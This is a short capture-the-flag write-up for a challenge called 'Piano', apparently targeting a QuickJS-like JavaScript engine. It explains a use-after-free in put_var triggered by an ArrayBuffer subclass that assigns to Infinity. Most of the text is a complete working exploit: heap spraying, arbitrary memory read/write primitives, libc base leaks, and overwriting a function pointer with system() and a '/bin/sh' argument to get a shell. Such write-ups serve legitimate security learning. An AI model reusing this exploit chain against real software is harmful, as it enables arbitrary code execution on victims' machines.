# Piano

Use-after-free in `put_var` when handling exceptions.

To trigger it,

```javascript
let k = null;
class a extends ArrayBuffer {
    constructor(bytes) {
        super(bytes, { maxByteLength: 0x1000 });
        k = new DataView(this);
        Infinity = this;
    }
}
```

We can capture the exception
```javascript
try {
    new a(0x100);
} catch(e) { }
```

Then, do some heap spraying, make sure the dangling array buffer has `array_buffer->detached == false`, then locate another array buffer to perform arbitrary memory read/write.

```javascript
let k = null;
class a extends ArrayBuffer {
    constructor(bytes) {
        super(bytes, { maxByteLength: 0x1000 });
        k = new DataView(this);
        Infinity = this;
    }
}

let arr_arr = [];
new ArrayBuffer(0x80);
new ArrayBuffer(0x80);
new ArrayBuffer(0x80);
let padding = new DataView(new ArrayBuffer(0x80));
let ab = new ArrayBuffer(0x770);
function hex(v) {
    return '0x' + v.toString(16).padStart(16, '0');
}
try {
    let arrbuf = new a(0xa00);
} catch (e) {
    for (let i = 0; i < 0x4; i++) {
        let a = new DataView(ab);
        arr_arr.push(a);
    }
    let target = new ArrayBuffer(0x1337);
    let target_dv = new DataView(target);

    let target_idx = -1;
    for (let i = 0; i < 0x1000; i += 8) {
        if (k.getBigUint64(i, true) == 0xffffffff00001336n + 0x1n) {
            target_idx = i;
            break;
        }
    }
    if (target_idx == -1) {
        throw "Error";
    }
    let raw_buffer_idx = target_idx + 0x10;
    let heap = k.getBigUint64(raw_buffer_idx, true);
    let text_addr = k.getBigUint64(target_idx + 0x30, true) - 0xc9df5n;
    const arb_read = (addr) => {
        k.setBigUint64(raw_buffer_idx, addr, true);
        return target_dv.getBigUint64(0x0, true);
    }
    const arb_write = (addr, value) => {
        k.setBigUint64(raw_buffer_idx, addr, true);
        target_dv.setBigUint64(0x0, value, true);
    }
    let libcbase = arb_read(text_addr + 0x129c00n) - 0xadd30n;

    let system_addr = libcbase + 0x58750n;
    let fptr = -1;
    for (let i = 0n; i < 0x1000000n; i += 8n) {
        let addr = heap - i;
        let v = arb_read(addr);
        if (v == text_addr + 0x1531dn) {
            fptr = addr;
            break;
        }
    }
    arb_write(fptr + 0x18n, 0x68732f6e69622fn);
    arb_write(fptr, system_addr);
}
```
